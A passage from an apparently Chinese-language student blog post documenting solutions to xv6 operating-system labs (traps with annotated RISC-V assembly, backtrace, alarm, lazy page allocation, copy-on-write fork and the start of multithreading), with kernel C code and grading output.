class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">int g(int x) &#123;</span><br><span class="line">   0:	1141                	addi	sp,sp,-16</span><br><span class="line">   2:	e422                	sd	s0,8(sp)</span><br><span class="line">   4:	0800                	addi	s0,sp,16</span><br><span class="line">  return x+3;</span><br><span class="line">&#125;</span><br><span class="line">   6:	250d                	addiw	a0,a0,3</span><br><span class="line">   8:	6422                	ld	s0,8(sp)</span><br><span class="line">   a:	0141                	addi	sp,sp,16</span><br><span class="line">   c:	8082                	ret</span><br><span class="line"></span><br><span class="line">000000000000000e &lt;f&gt;:</span><br><span class="line"></span><br><span class="line">int f(int x) &#123;</span><br><span class="line">   e:	1141                	addi	sp,sp,-16</span><br><span class="line">  10:	e422                	sd	s0,8(sp)</span><br><span class="line">  12:	0800                	addi	s0,sp,16</span><br><span class="line">  return g(x);</span><br><span class="line">&#125;</span><br><span class="line">  14:	250d                	addiw	a0,a0,3</span><br><span class="line">  16:	6422                	ld	s0,8(sp)</span><br><span class="line">  18:	0141                	addi	sp,sp,16</span><br><span class="line">  1a:	8082                	ret</span><br><span class="line"></span><br><span class="line">000000000000001c &lt;main&gt;:</span><br><span class="line"></span><br><span class="line">void main(void) &#123;</span><br><span class="line">  1c:	1141                	addi	sp,sp,-16</span><br><span class="line">  #sp=sp+0x10</span><br><span class="line">  1e:	e406                	sd	ra,8(sp)</span><br><span class="line">  # *(sp+0x8)=ra</span><br><span class="line">  20:	e022                	sd	s0,0(sp)</span><br><span class="line">  #*(sp+0x0)=s0,s0相当于x86中的rbp我感觉，就是记录栈顶的值，即帧指针</span><br><span class="line">  22:	0800                	addi	s0,sp,16</span><br><span class="line">  #s0=sp+0x10,就是记录这个函数的帧指针</span><br><span class="line">  printf(&quot;%d %d\n&quot;, f(8)+1, 13);</span><br><span class="line">  24:	4635                	li	a2,13</span><br><span class="line">  #a2=13</span><br><span class="line">  26:	45b1                	li	a1,12</span><br><span class="line">  #a1=12</span><br><span class="line">  28:	00000517          	auipc	a0,0x0</span><br><span class="line">  #a0=(0x0&lt;&lt;12)+pc</span><br><span class="line">  #auipc rd, imm # 将 20 位的立即数左移12位，低 12 位补零，将得到的 32 位数与 pc 的值相加，最后写回寄存器 rd 中</span><br><span class="line">  2c:	7a850513          	addi	a0,a0,1960 # 7d0 &lt;malloc+0xea&gt;</span><br><span class="line">  #a0=a0+1960,此时a0就存储着字符串的地址了。，感觉就是相对于pc的寻址，只不过拆成了两步</span><br><span class="line">  30:	00000097          	auipc	ra,0x0</span><br><span class="line">  #ra=(0x0&lt;&lt;12)+pc</span><br><span class="line">  34:	5f8080e7          	jalr	1528(ra) # 628 &lt;printf&gt;</span><br><span class="line">  #pc=ra+1528, ra+=8,此时就跳转到了printf函数</span><br><span class="line">  exit(0);</span><br><span class="line">  38:	4501                	li	a0,0</span><br><span class="line">  #a0=0</span><br><span class="line">  3a:	00000097          	auipc	ra,0x0</span><br><span class="line">  #ra=pc</span><br><span class="line">  3e:	276080e7          	jalr	630(ra) # 2b0 &lt;exit&gt;</span><br><span class="line">  #pc=ra+630,ra+=8</span><br></pre></td></tr></table></figure>

<p>一行一行分析下来发现其实并没有调用f和g函数，被编译器优化掉了，直接把12赋值给a1,13赋值给a2了。</p>
<p>问题</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">哪些寄存器保存函数的参数？例如，在main对printf的调用中，哪个寄存器保存13？</span><br><span class="line">a2</span><br><span class="line">main的汇编代码中对函数f的调用在哪里？对g的调用在哪里(提示：编译器可能会将函数内联）</span><br><span class="line">并没有对f和g函数进行调用</span><br><span class="line">printf函数位于哪个地址？</span><br><span class="line">0x628</span><br><span class="line">在main中printf的jalr之后的寄存器ra中有什么值？</span><br><span class="line">0x38</span><br><span class="line">运行以下代码。</span><br><span class="line">unsigned int i = 0x00646c72;</span><br><span class="line">printf(&quot;H%x Wo%s&quot;, 57616, &amp;i);</span><br><span class="line">He110 World</span><br><span class="line">在下面的代码中，“y=”之后将打印什么(注：答案不是一个特定的值）？为什么会发生这种情况？</span><br><span class="line">printf(&quot;x=%d y=%d&quot;, 3);</span><br><span class="line">不确定，因为参数三并没有被指定，所以此时a2寄存器是什么值就输出什么值</span><br></pre></td></tr></table></figure>

<h3 id="Backtrace"><a href="#Backtrace" class="headerlink" title="Backtrace"></a>Backtrace</h3><p>就是利用s0和ra来打印回溯函数链</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">backtrace</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">  uint64 s0=r_fp();</span><br><span class="line">  uint64 kstack_base=PGROUNDDOWN(s0)+<span class="number">0x1000</span>;</span><br><span class="line">  <span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%p\n&quot;</span>,*(uint64 *)(s0<span class="number">-0x8</span>));</span><br><span class="line">    s0=*(uint64 *)(s0<span class="number">-0x10</span>);</span><br><span class="line">    <span class="keyword">if</span>(s0&gt;=kstack_base)&#123;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="Alarm"><a href="#Alarm" class="headerlink" title="Alarm"></a>Alarm</h3><p>虽然是困难级别的，但是感觉比页表那块的实验要友善很多了，就是对alarm理解的有点偏差，导致卡了一会会。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">uint64 <span class="title">sys_sigalarm</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">proc</span> *<span class="title">p</span>=</span>myproc();</span><br><span class="line">  p-&gt;alarm_handler=(<span class="keyword">void</span> *)p-&gt;trapframe-&gt;a1;</span><br><span class="line">  p-&gt;alarm_total_time=p-&gt;trapframe-&gt;a0;</span><br><span class="line">  p-&gt;trapframe-&gt;a0=<span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">uint64 <span class="title">sys_sigreturn</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">proc</span> *<span class="title">p</span>=</span>myproc();</span><br><span class="line">  memmove(p-&gt;trapframe,p-&gt;alarm_trapframe,<span class="keyword">sizeof</span>(struct trapframe));</span><br><span class="line">  p-&gt;is_alarm=<span class="number">0</span>;</span><br><span class="line">  p-&gt;trapframe-&gt;a0=<span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"> <span class="keyword">if</span>(p-&gt;alarm_total_time!=<span class="number">0</span>)&#123;</span><br><span class="line">      p-&gt;alarm_time+=<span class="number">1</span>;</span><br><span class="line">      <span class="keyword">if</span>((p-&gt;alarm_time&gt;=p-&gt;alarm_total_time)&amp;&amp;(p-&gt;is_alarm==<span class="number">0</span>))&#123;</span><br><span class="line">        memmove(p-&gt;alarm_trapframe,p-&gt;trapframe,<span class="keyword">sizeof</span>(struct trapframe));</span><br><span class="line">        p-&gt;trapframe-&gt;epc=(uint64)p-&gt;alarm_handler;</span><br><span class="line">        p-&gt;alarm_handler=<span class="number">0</span>;</span><br><span class="line">        p-&gt;alarm_time=<span class="number">0</span>;</span><br><span class="line">        p-&gt;is_alarm=<span class="number">1</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h3 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">== Test time == </span><br><span class="line">time: OK </span><br><span class="line">Score: 85/85</span><br></pre></td></tr></table></figure>

<h3 id="结语-2"><a href="#结语-2" class="headerlink" title="结语"></a>结语</h3><p>通过这个实验更加深刻的了解了xv6的内核和用户态之间的切换，修改起xv6相关代码也十分顺手了。</p>
<h2 id="LAB5-xv6-lazy-page-allocation"><a href="#LAB5-xv6-lazy-page-allocation" class="headerlink" title="LAB5: xv6 lazy page allocation"></a>LAB5: xv6 lazy page allocation</h2><p>这个实验比较简单，就是实现简单的惰性分配</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span></span></span><br><span class="line"><span class="function"><span class="title">argaddr</span><span class="params">(<span class="keyword">int</span> n, uint64 *ip)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  *ip = argraw(n);</span><br><span class="line">  <span class="keyword">char</span> *mem;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">proc</span> *<span class="title">p</span>=</span>myproc();</span><br><span class="line">  uint64 va;</span><br><span class="line">  <span class="keyword">if</span>((walkaddr(p-&gt;pagetable,*ip)==<span class="number">0</span>))&#123;</span><br><span class="line">    <span class="keyword">if</span>((PGROUNDUP(p-&gt;trapframe-&gt;sp)<span class="number">-1</span>&lt;(*ip))&amp;&amp;((*ip)&lt;p-&gt;sz))&#123;</span><br><span class="line">      mem=kalloc();</span><br><span class="line">      <span class="keyword">if</span>(!mem)&#123;</span><br><span class="line">        p-&gt;killed=<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="built_in">memset</span>(mem,<span class="number">0</span>,PGSIZE);</span><br><span class="line">      va=PGROUNDDOWN(*ip);</span><br><span class="line">      <span class="keyword">if</span>(mappages(p-&gt;pagetable, va, PGSIZE, (uint64)mem, PTE_W|PTE_X|PTE_R|PTE_U) != <span class="number">0</span>)&#123;</span><br><span class="line">        panic(<span class="string">&quot;mappages fail&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">      p-&gt;killed=<span class="number">1</span>;</span><br><span class="line">      <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(r_scause() == <span class="number">13</span>||r_scause() == <span class="number">15</span>)&#123;</span><br><span class="line">    uint64 bad_addr=r_stval();</span><br><span class="line">    <span class="keyword">char</span> *mem=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span>((bad_addr&lt;p-&gt;sz)&amp;&amp;((mem=kalloc())!=<span class="number">0</span>)&amp;&amp;(PGROUNDUP(p-&gt;trapframe-&gt;sp)<span class="number">-1</span>&lt;bad_addr))&#123;</span><br><span class="line">      uint64 va=PGROUNDDOWN(bad_addr);</span><br><span class="line">      <span class="built_in">memset</span>(mem,<span class="number">0</span>,PGSIZE);</span><br><span class="line">      <span class="keyword">if</span>(mappages(p-&gt;pagetable, va, PGSIZE, (uint64)mem, PTE_W|PTE_X|PTE_R|PTE_U) != <span class="number">0</span>)&#123;</span><br><span class="line">        panic(<span class="string">&quot;mappages fail&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        p-&gt;killed=<span class="number">1</span>;</span><br><span class="line">      &#125;</span><br></pre></td></tr></table></figure>

<h3 id="结果-1"><a href="#结果-1" class="headerlink" title="结果"></a>结果</h3><h2 id="Lab6-Copy-on-Write-Fork-for-xv6"><a href="#Lab6-Copy-on-Write-Fork-for-xv6" class="headerlink" title="Lab6: Copy-on-Write Fork for xv6"></a>Lab6: Copy-on-Write Fork for xv6</h2><p>就是实现fork时的cow机制，我的思路是在fork的时候没有<code>w</code>权限的直接直接复制映射，如果有<code>w</code>权限的符知进程的flag全部<code>&amp;(~PTE_W)|PTE_COW</code>,这样<code>PTE_COW</code>标志就既可以判断是否是cow映射，还可以标识这个映射是有<code>w</code>权限的，这样就防止了子进程的权限管理不严格，比如子进程写不可写页面之类的。</p>
<p>由于我没有使用锁，多进程的<code>kfree()</code>就会出现问题hhh,但是把cow实现成功我就心满意足了，下面是代码，不过代码写的很臃肿。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span></span></span><br><span class="line"><span class="function"><span class="title">kfree</span><span class="params">(<span class="keyword">void</span> *pa)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">run</span> *<span class="title">r</span>;</span></span><br><span class="line">  <span class="comment">// printf(&quot;kfree b\n&quot;);</span></span><br><span class="line">  <span class="keyword">if</span>(((uint64)pa % PGSIZE) != <span class="number">0</span> || (<span class="keyword">char</span>*)pa &lt; end || (uint64)pa &gt;= PHYSTOP)</span><br><span class="line">    panic(<span class="string">&quot;kfree&quot;</span>);</span><br><span class="line">  uint64 num=(uint64)pa;</span><br><span class="line">  <span class="keyword">if</span>((--cow_num[num&gt;&gt;<span class="number">12</span>])!=<span class="number">0</span>)&#123;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// Fill with junk to catch dangling refs.</span></span><br><span class="line">  <span class="built_in">memset</span>(pa, <span class="number">1</span>, PGSIZE);</span><br><span class="line"></span><br><span class="line">  r = (struct run*)pa;</span><br><span class="line"></span><br><span class="line">  acquire(&amp;kmem.lock);</span><br><span class="line">  r-&gt;next = kmem.freelist;</span><br><span class="line">  kmem.freelist = r;</span><br><span class="line">  <span class="comment">// printf(&quot;free e\n&quot;);</span></span><br><span class="line">  release(&amp;kmem.lock);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Allocate one 4096-byte page of physical memory.</span></span><br><span class="line"><span class="comment">// Returns a pointer that the kernel can use.</span></span><br><span class="line"><span class="comment">// Returns 0 if the memory cannot be allocated.</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> *</span></span><br><span class="line"><span class="function"><span class="title">kalloc</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">run</span> *<span class="title">r</span>;</span></span><br><span class="line"></span><br><span class="line">  acquire(&amp;kmem.lock);</span><br><span class="line">  r = kmem.freelist;</span><br><span class="line">  <span class="keyword">if</span>(r)</span><br><span class="line">    kmem.freelist = r-&gt;next;</span><br><span class="line">  release(&amp;kmem.lock);</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">if</span>(r)&#123;</span><br><span class="line">    <span class="built_in">memset</span>((<span class="keyword">char</span>*)r, <span class="number">5</span>, PGSIZE); <span class="comment">// fill with junk</span></span><br><span class="line">  &#125;</span><br><span class="line">  uint64 num=(uint64)r;</span><br><span class="line">  cow_num[num&gt;&gt;<span class="number">12</span>]++;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">return</span> (<span class="keyword">void</span>*)r;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(r_scause()==<span class="number">15</span>)&#123;</span><br><span class="line">    <span class="comment">// printf(&quot;taps b\n&quot;);</span></span><br><span class="line"></span><br><span class="line">    uint64 write_addr=r_stval();</span><br><span class="line">    uint64 va=PGROUNDDOWN(write_addr);</span><br><span class="line">    <span class="keyword">pte_t</span> *pte;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(write_addr&lt;MAXVA)&#123;</span><br><span class="line">      pte=walk(p-&gt;pagetable,va,<span class="number">0</span>);</span><br><span class="line">      <span class="keyword">if</span>((*pte &amp; PTE_V) == <span class="number">0</span>)&#123;</span><br><span class="line">        panic(<span class="string">&quot;cow usertap pte fail&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      uint flags=PTE_FLAGS(*pte);</span><br><span class="line">      <span class="keyword">char</span> *mem=<span class="number">0</span>;</span><br><span class="line">      <span class="keyword">if</span>(((flags|PTE_COW)!=<span class="number">0</span>)&amp;&amp;(write_addr&lt;p-&gt;sz)&amp;&amp;((mem=kalloc())!=<span class="number">0</span>))&#123;</span><br><span class="line">        uint64 pa=PTE2PA(*pte);</span><br><span class="line">        memmove(mem,(<span class="keyword">void</span> *)pa,PGSIZE);</span><br><span class="line">        flags=(flags&amp;(~PTE_COW))|PTE_W;</span><br><span class="line">        *pte=PA2PTE(mem)|flags;</span><br><span class="line">        kfree((<span class="keyword">void</span> *)pa);</span><br><span class="line">      &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        p-&gt;killed=<span class="number">1</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">      p-&gt;killed=<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    copyout(<span class="keyword">pagetable_t</span> pagetable, uint64 dstva, <span class="keyword">char</span> *src, uint64 len)</span><br><span class="line">&#123;</span><br><span class="line">  uint64 n, va0, pa0;</span><br><span class="line">  <span class="keyword">pte_t</span> *pte;</span><br><span class="line">  uint flags;</span><br><span class="line">  <span class="keyword">char</span> *mem=<span class="number">0</span>;</span><br><span class="line">  <span class="comment">// printf(&quot;copyout b\n&quot;);</span></span><br><span class="line">  <span class="keyword">while</span>(len &gt; <span class="number">0</span>)&#123;</span><br><span class="line">    va0 = PGROUNDDOWN(dstva);</span><br><span class="line">    pa0 = walkaddr(pagetable, va0);</span><br><span class="line">    <span class="keyword">if</span>(va0&lt;MAXVA)&#123;</span><br><span class="line">      pte=walk(pagetable,va0,<span class="number">0</span>);</span><br><span class="line">      <span class="keyword">if</span>(pte ==<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      flags=PTE_FLAGS(*pte);</span><br><span class="line">      <span class="keyword">if</span>((flags&amp;PTE_COW)!=<span class="number">0</span>&amp;&amp;((mem=kalloc())!=<span class="number">0</span>))&#123;</span><br><span class="line">        uint64 pa=PTE2PA(*pte);</span><br><span class="line">        memmove(mem,(<span class="keyword">void</span> *)pa,PGSIZE);</span><br><span class="line">        flags=(flags&amp;(~PTE_COW))|PTE_W;</span><br><span class="line">        *pte=PA2PTE(mem)|flags;</span><br><span class="line">        kfree((<span class="keyword">void</span> *)pa);</span><br><span class="line">        pa0=(uint64)mem;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>(pa0 == <span class="number">0</span>)</span><br><span class="line">      <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    n = PGSIZE - (dstva - va0);</span><br><span class="line">    <span class="keyword">if</span>(n &gt; len)</span><br><span class="line">      n = len;</span><br><span class="line">    memmove((<span class="keyword">void</span> *)(pa0 + (dstva - va0)), src, n);</span><br><span class="line"></span><br><span class="line">    len -= n;</span><br><span class="line">    src += n;</span><br><span class="line">    dstva = va0 + PGSIZE;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// printf(&quot;copyout e\n&quot;);</span></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span></span></span><br><span class="line"><span class="function"><span class="title">uvmcopy</span><span class="params">(<span class="keyword">pagetable_t</span> old, <span class="keyword">pagetable_t</span> <span class="keyword">new</span>, uint64 sz)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">pte_t</span> *pte;</span><br><span class="line">  uint64 pa, i;</span><br><span class="line">  uint flags;</span><br><span class="line">  <span class="comment">// uint64 num;</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; sz; i += PGSIZE)&#123;</span><br><span class="line">    <span class="keyword">if</span>((pte = walk(old, i, <span class="number">0</span>)) == <span class="number">0</span>)</span><br><span class="line">      panic(<span class="string">&quot;uvmcopy: pte should exist&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>((*pte &amp; PTE_V) == <span class="number">0</span>)</span><br><span class="line">      panic(<span class="string">&quot;uvmcopy: page not present&quot;</span>);</span><br><span class="line">    pa = PTE2PA(*pte);</span><br><span class="line">    cow_num[(pa&gt;&gt;<span class="number">12</span>)]++;</span><br><span class="line">    flags = PTE_FLAGS(*pte);</span><br><span class="line">    <span class="keyword">if</span>(flags&amp;PTE_W)&#123;</span><br><span class="line">      *pte=(*pte)|PTE_COW;</span><br><span class="line">      *pte=(*pte)&amp;(~PTE_W);</span><br><span class="line">      flags=flags|PTE_COW;</span><br><span class="line">      flags=(flags&amp;(~PTE_W));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// flags = (PTE_FLAGS(*pte)&amp;(~PTE_W))|PTE_COW;</span></span><br><span class="line">    <span class="keyword">if</span>(mappages(<span class="keyword">new</span>, i, PGSIZE, (uint64)pa, flags) != <span class="number">0</span>)&#123;</span><br><span class="line">      panic(<span class="string">&quot;uvmcopy fail&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//  err:</span></span><br><span class="line"><span class="comment">//   uvmunmap(new, 0, i / PGSIZE, 1);</span></span><br><span class="line"><span class="comment">//   return -1;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="结果-2"><a href="#结果-2" class="headerlink" title="结果"></a>结果</h3><p>满分，好欸</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">os@os-virtual-machine:~/xxv6/xv6-labs-2020$ ./grade-lab-cow </span><br><span class="line">make: “kernel/kernel”已是最新。</span><br><span class="line">== Test running cowtest == (4.9s) </span><br><span class="line">== Test   simple == </span><br><span class="line">  simple: OK </span><br><span class="line">== Test   three == </span><br><span class="line">  three: OK </span><br><span class="line">== Test   file == </span><br><span class="line">  file: OK </span><br><span class="line">== Test usertests == (107.3s) </span><br><span class="line">    (Old xv6.out.usertests failure <span class="built_in">log</span> removed)</span><br><span class="line">== Test   usertests: copyin == </span><br><span class="line">  usertests: copyin: OK </span><br><span class="line">== Test   usertests: copyout == </span><br><span class="line">  usertests: copyout: OK </span><br><span class="line">== Test   usertests: all tests == </span><br><span class="line">  usertests: all tests: OK </span><br><span class="line">== Test time == </span><br><span class="line">time: OK </span><br><span class="line">Score: 110/110</span><br></pre></td></tr></table></figure>

<h2 id="Lab7-Multithreading"><a href="#Lab7-Multithreading" class="headerlink" title="Lab7: Multithreading"></a>Lab7: Multithreading</h2><h3 id="Uthread-switching-between-threads-moderate"><a href="#Uthread-switching-between-threads-moderate" class="headerlink" title="Uthread: switching between threads (moderate)"></a>Uthread: switching between threads (moderate)</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span 